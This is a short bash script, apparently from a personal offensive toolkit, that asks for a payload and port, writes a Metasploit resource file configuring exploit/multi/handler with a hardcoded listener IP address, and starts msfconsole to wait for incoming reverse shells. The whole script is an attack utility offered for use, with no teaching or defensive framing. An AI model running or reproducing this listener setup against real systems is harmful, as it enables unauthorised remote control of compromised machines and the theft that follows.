#!/bin/bash
ip=177.157.135.216
echo "payload: "
read -e payload
echo "ports: "
read port

cat > /home/kusanagi/.deadSec/.bashScripts/.config.rc <<EOF
use exploit/multi/handler
set payload $payload
set lhost $ip
set lport $port
options
EOF

msfconsole -q -r /home/kusanagi/.deadSec/.bashScripts/.config.rc
